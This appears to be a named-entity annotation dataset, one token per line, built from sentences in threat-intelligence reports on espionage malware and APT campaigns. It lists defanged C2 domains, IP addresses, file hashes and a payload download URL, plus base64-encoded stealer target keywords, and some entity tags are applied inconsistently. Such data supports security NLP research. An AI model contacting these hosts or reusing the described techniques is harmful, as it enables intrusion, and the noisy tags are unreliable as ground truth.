Control	O
server	O
.	O

'	O
A	O
Rood	O
Awakening	O
!	O

a5bddb5b10d673cbfe9b16a062ac78c9aa75b61c	B-Indicator
2016-10-06	O
11:03:54	O
Malicious	O
Word	O
document	O
with	O
Phishing	O
text	O
in	O
Vietnamese	O
blog(.)versign(.)info	B-Indicator
(	O
23.227.196[.]210	B-Indicator
)	O
Images.verginnet(.)info	B-Indicator
id.madsmans(.)com	B-Indicator
(	O
176.107.176[.]6	B-Indicator
)	O
tonholding(.)com	B-Indicator
nsquery(.)net	B-Indicator
tonholding(.)com	B-Indicator
nsquery(.)net	B-Indicator
teriava(.)com	B-Indicator
Thong	O
tin.doc	O
a5fbcbc17a1a0a4538fd987291f8dafd17878e33	B-Indicator
2016-10-25	O
Malicious	O
Word	O
document	O
with	O
Phishing	O
text	O
in	O
Vietnamese	O
WinWord.exe	O
ea67b24720da7b4adb5c7a8a9e8f208806fbc198	B-Indicator
Cobalt	O
Strike	O
payload	O
Downloads	O
hxxp://images.verginnet(.)info/2NX7M	B-Indicator
Using	O
Cobalt	O
Strike	O
malleable	O
c2	O
oscp	O
profile	O
SndVolSSO.exe	O
1fef52800fa9b752b98d3cbb8fff0c44046526aa	B-Indicator
2016-08-01	O
09:03:58	O
Denis	B-Malware
Backdoor	O
Variant	O
Xwizard	O
/	O
KB12345678.exe	O
d48602c3c73e8e33162e87891fb36a35f621b09b	B-Indicator
2016-08-01	O
CiscoEapFast.exe	O
77dd35901c0192e040deb9cc7a981733168afa74	B-Indicator
2017-02-28	O
16:37:12	O
Denis	B-Malware
Backdoor	O
Variant	O

Information	O
harvesting	O
:	O
After	O
gaining	O
root	O
privileges	O
the	O
attackers	O
can	O
intercept	O
any	O
information	O
that	O
goes	O
in	O
or	O
out	O
of	O
the	O
infected	O
computer	O
.	O

To	O
learn	O
more	O
,	O
read	O
our	O
Security	O
101	O
:	O
Business	O
Process	O
Compromise	O
.	O

jduhf873jdu7.blog.163.com	B-Indicator

A	O
memory	O
corruption	O
vulnerability	O
in	O
some	O
versions	O
of	O
Microsoft	B-Organization
Internet	B-System
Explorer	B-Version
may	O
lead	O
to	O
remote	O
code	O
execution	O
or	O
an	O
application	O
crash	O
.	O

khanji[.]ddns[.]net	B-Indicator
139[.]190[.]6[.]180	B-Indicator
39[.]40[.]141[.]25	B-Indicator
175[.]110[.]165[.]110	B-Indicator
39[.]40[.]44[.]245	B-Indicator
39[.]40[.]67[.]219	B-Indicator
119[.]160[.]68[.]178	B-Indicator
175[.]107[.]13[.]215	B-Indicator
39[.]47[.]125[.]110	B-Indicator
175[.]107[.]5[.]247	B-Indicator
175[.]107[.]6[.]174	B-Indicator
182[.]191[.]90[.]91	B-Indicator
175[.]107[.]7[.]50	B-Indicator
182[.]191[.]90[.]92	B-Indicator
175[.]107[.]7[.]69	B-Indicator
39[.]47[.]84[.]127	B-Indicator
192[.]169[.]136[.]121	B-Indicator
155[.]254[.]225[.]24	B-Indicator
203[.]31[.]216[.]214	B-Indicator
45[.]42[.]243[.]20	B-Indicator

Once	O
the	O
RAT	B-Malware
is	O
installed	O
on	O
the	O
host	O
it	O
will	O
be	O
used	O
to	O
administer	O
the	O
client	O
,	O
exfiltrate	O
data	O
,	O
or	O
leverage	O
the	O
client	O
as	O
a	O
pivot	O
to	O
attack	O
an	O
organization	O
's	O
internal	O
infrastructure	O
.	O

There	O
does	O
not	O
appear	O
to	O
be	O
any	O
reason	O
for	O
the	O
Professional	O
Commmons	O
website	O
to	O
have	O
a	O
hidden	O
iFrame	O
link	O
randomly	O
placed	O
in	O
the	O
middle	O
of	O
its	O
HTML	O
code	O
.	O

One	O
of	O
the	O
organizations	O
compromised	O
by	O
Chafer	O
in	O
2017	O
was	O
a	O
telecoms	O
services	O
provider	O
in	O
the	O
Middle	O
East	O
,	O
which	O
sells	O
its	O
solutions	O
to	O
multiple	O
telecoms	O
operators	O
in	O
the	O
region	O
.	O

More	O
specifically	O
,	O
this	O
threat	O
analysis	O
is	O
intended	O
for	O
security	O
operations	O
center	O
(	O
SOC	O
)	O
analysts	O
and	O
engineers	O
.	O

The	O
sample	O
in	O
question	O
was	O
not	O
an	O
actual	O
CozyDuke	B-Malware
main	O
component	O
,	O
but	O
a	O
CozyDuke	B-Malware
module	O
.	O

The	O
process	O
is	O
identified	O
by	O
the	O
control	O
server	O
sending	O
the	O
PID	O
to	O
the	O
malware	O
.	O

This	O
conclusion	O
is	O
supported	O
by	O
the	O
following	O
assessments	O
:	O
The	O
campaigns	O
target	O
different	O
industries	O
in	O
different	O
geographic	O
locations	O
.	O

2017	O
was	O
not	O
any	O
different	O
in	O
this	O
regard	O
.	O

The	O
threat	O
actor	O
targeted	O
the	O
company	O
's	O
top-level	O
management	O
by	O
using	O
sophisticated	O
spear-phishing	O
attacks	O
as	O
the	O
initial	O
penetration	O
vector	O
,	O
ultimately	O
compromising	O
the	O
computers	O
of	O
vice	O
presidents	O
,	O
senior	O
directors	O
and	O
other	O
key	O
personnel	O
in	O
the	O
operational	O
departments	O
.	O

The	O
attack	O
has	O
also	O
been	O
observed	O
against	O
the	O
financial	O
sector	O
in	O
Saudi	O
Arabia	O
and	O
Russia	O
.	O

It	O
is	O
not	O
clear	O
whether	O
the	O
compilation	O
timestamps	O
are	O
falsified	O
,	O
but	O
an	O
earlier	O
compilation	O
time	O
than	O
the	O
actual	O
stamp	O
seems	O
unlikely	O
.	O

However	O
,	O
we	O
observed	O
only	O
six	O
of	O
these	O
servers	O
active	O
at	O
any	O
given	O
time	O
,	O
suggesting	O
that	O
some	O
IP	O
addresses	O
may	O
have	O
changed	O
during	O
our	O
scans	O
.	O

110.173.188.53:443	B-Indicator
70.60.36.183:443	B-Indicator
72.10.122.70:443	B-Indicator
112.160.75.159:5443	B-Indicator
125.142.192.81:443	B-Indicator
175.213.42.234:443	B-Indicator
Yara	O
Rules	O

INV#94586.jar	B-Malware

Below	O
are	O
examples	O
of	O
a	O
document	O
and	O
a	O
malicious	O
email	O
,	O
targeting	O
Arabic	O
speaking	O
victims	O
.	O

Valid	O
:	O
1:00	B-Version
AM	O
8/5/2011	B-Version
to	O
12:59	B-Version
AM	O
8/5/2012	B-Version

Download	O
and	O
execute	O
more	O
malicious	O
executables	O
.	O

SHA1	O
hash	O
:	O
394703d1240ccd3aaeeef50c212313e3036741b1	B-Indicator

The	O
malware	O
also	O
uses	O
the	O
legitimate	O
cURL	O
library	O
in	O
the	O
form	O
of	O
libcurld.dll	O
.	O

이	O
위협	O
그룹은	O
2014년과	O
2015년에	O
걸쳐	O
발생한	O
사이버	O
공격	O
'	O
오퍼레이션	O
블랙	O
마인	O
(	O
Operation	B-Malware
Black	I-Malware
Mine	I-Malware
)	O
'	O
과도	O
연관성이	O
있다	O
.	O

generateHttpMes	O
:	O
data_size	O
:	O
size_http_mes	O
:	O
]	O

TrendLabs	O
Security	O
Intelligence	O
Blog	O
,	O
Trend	O
Micro	O
.	O

Next	O
,	O
the	O
RAT	B-Malware
calls	O
a	O
function	O
that	O
uses	O
the	O
decrypted	O
confi	O
guration	O
data	O
to	O
populate	O
the	O
following	O
fi	O
elds	O
:	O
lpszHost	O
,	O
dwPort	O
,	O
lpszProxyHost	O
,	O
dwProxyPort	O
,	O
lpszProxyUser	O
,	O
lpszProxyPass	O
.	O

The	O
malware	O
overwrites	O
the	O
master	O
boot	O
record	O
(	O
MBR	O
)	O
and	O
the	O
rest	O
of	O
the	O
harddisk	O
with	O
the	O
strings	O
'	O
PRINCIPES	O
'	O
or	O
'	O
HASTATI	O
.	O
'	O
.	O

The	O
attacker	O
could	O
have	O
caused	O
a	O
process	O
shutdown	O
by	O
issuing	O
a	O
halt	O
command	O
or	O
intentionally	O
uploading	O
flawed	O
code	O
to	O
the	O
SIS	O
controller	O
to	O
cause	O
it	O
to	O
fail	O
.	O

Research	O
into	O
this	O
HIGHTIDE	B-Malware
campaign	O
revealed	O
APT12	O
targeted	O
multiple	O
Taiwanese	O
Government	O
organizations	O
between	O
August	O
22	O
and	O
28	O
.	O

'	O
!	O
cp	O
cf	O
e	O
:	O
%	O
d	O
'	O
'	O
!	O
c	O
r\n	O
'	O
'	O
!	O
c	O
tr\n	O
'	O
'	O
!	O
c	O
.inf	O
,	O
e	O
:	O
%	O
d	O
'	O
'	O
'	O
!	O
C	O
c\n	O
'	O
'	O
!	O
c	O
.inf	O
'	O
'	O
!	O
c	O
ser	O
'	O

To	O
determine	O
how	O
long	O
the	O
server	O
has	O
been	O
connected	O
to	O
the	O
client	O
,	O
the	O
return	O
value	O
of	O
the	O
function	O
GetTickCount	O
(	O
)	O
gets	O
saved	O
.	O

Threat	O
Connect	O
.	O

Launcher	O
:	O
This	O
module	O
itself	O
.	O

All	O
other	O
product	O
or	O
company	O
names	O
may	O
be	O
trademarks	O
or	O
registered	O
trademarks	O
of	O
their	O
owners	O
.	O

Sofacy	B-System
,	O
one	O
of	O
the	O
most	O
active	O
APT	O
we	O
monitor	O
,	O
continues	O
to	O
spearphish	O
their	O
way	O
into	O
targets	O
,	O
reportedly	O
widely	O
phishes	O
for	O
credentials	O
,	O
and	O
infrequently	O
participates	O
in	O
server	O
side	O
activity	O
(	O
including	O
host	O
compromise	O
with	O
BeEF	B-Malware
deployment	I-Malware
,	O
for	O
example	O
)	O
.	O

Dino	B-Malware
's	O
configuration	O
is	O
initially	O
stored	O
in	O
a	O
serialized	O
DataStore	O
object	O
contained	O
in	O
a	O
zip	O
archive	O
at	O
the	O
end	O
of	O
the	O
Dino	B-Malware
binary	O
.	O

There	O
were	O
several	O
leftover	O
comments	O
in	O
the	O
plugin	O
in	O
Chinese	O
.	O

dG9yLmRvYw==	O
cGFzc3dvcmRz	O
cGF5cGFs	O
bG9naW5zLg==	O
bG9naW5z	O
aWQucGRm	O
aWQuanBn	O

The	O
SPUSER14	O

The	O
commands	O
'	O
cronadd	O
'	O
,	O
'	O
cronlist	O
'	O
and	O
'	O
crondel	O
'	O
serve	O
respectively	O
to	O
add	O
,	O
list	O
,	O
and	O
remove	O
scheduled	O
tasks	O
registered	O
in	O
the	O
CRONTAB	O
module	O
.	O

In	O
this	O
blog	O
post	O
I	O
describe	O
a	O
new	O
attack	O
campaign	O
where	O
cyber	O
espionage	O
group	O
targeted	O
the	O
users	O
of.Mazagon	O
Dock	O
Shipbuilders	B-System
Limited	O
(	O
MDL	O
)	O
is	O
a	O
Public	O
Sector	O
Undertaking	O
of	O
Government	O
of	O
India	O
(	O
Ministry	O
of	O
Defence	O
)	O
and	O
it	O
specializes	O
in	O
manufacturing	O
warships	O
and	O
submarines	O
for	O
the	O
Indian	O
Navy	O
.	O

Scope	O
Note	O
:	O
Insikt	O
Group	O
conducted	O
interviews	O
with	O
a	O
former	O
Iranian	O
hacker	O
with	O
first-hand	O
knowledge	O
of	O
the	O
information	O
shared	O
and	O
was	O
living	O
in	O
Iran	O
when	O
he	O
started	O
one	O
of	O
Iran	O
's	O
first	O
security	O
forums	O
.	O

Hence	O
,	O
the	O
malware	O
also	O
intercepts	O
the	O
confirmation	O
SWIFT	O
messages	O
and	O
then	O
sends	O
for	O
printing	O
the	O
'	O
doctored	O
'	O
(	O
manipulated	O
)	O
copies	O
of	O
such	O
messages	O
in	O
order	O
to	O
cover	O
up	O
the	O
fraudulent	O
transactions	O
.	O

Figure	O
6	O
:	O

During	O
the	O
past	O
year	O
and	O
a	O
half	O
,	O
the	O
Iron	O
group	O
has	O
developed	O
multiple	O
types	O
of	O
malware	O
(	O
backdoors	O
,	O
crypto-miners	O
,	O
and	O
ransomware	O
)	O
for	O
Windows	O
,	O
Linux	O
and	O
Android	O
platforms	O
.	O

[	O
그림	O
14	O
]	O
원본	O
파일과	O
생성	O
파일	O
비교	O
[	O
표	O
2	O
]	O
는	O
Rifdoor와	B-Malware
관련된	O
주요	O
명령	O
및	O
해당	O
기능이다	O
.	O

This	O
suggests	O
that	O
attackers	O
had	O
prior	O
knowledge	O
of	O
the	O
recipient	O
email	O
id	O
through	O
other	O
means	O
.	O

Cobalt	B-System
Strike1.45	O
and	O
It	O
can	O
connect	O
the	O
metasploit	O
of	O
Windows	B-System
.	O

In	O
order	O
to	O
hide	O
the	O
fraudulent	O
transactions	O
carried	O
out	O
by	O
the	O
attacker	O
(	O
s	O
)	O
,	O
the	O
database/message	O
manipulations	O
are	O
not	O
sufficient	O
.	O

The	O
business	O
cycle	O
includes	O
what	O
is	O
euphemistically	O
referred	O
to	O
as	O
'	O
financial	O
forecasting	O
'	O
using	O
stolen	O
information	O
,	O
so	O
we	O
like	O
to	O
say	O
that	O
Poseidon	B-Malware
's	O
boutique	O
not	O
only	O
deals	O
in	O
targeted	O
attacks	O
but	O
also	O
stolen	O
treasures	O
.	O

At	O
first	O
glance	O
,	O
this	O
looks	O
like	O
an	O
(	O
almost	O
)	O
valid	O
,	O
although	O
minimalist	O
,	O
HTTP	O
request	O
that	O
is	O
terminated	O
with	O
a	O
double	O
carriage-return/line-feed	O
(	O
CRLF	O
)	O
combination	O
.	O
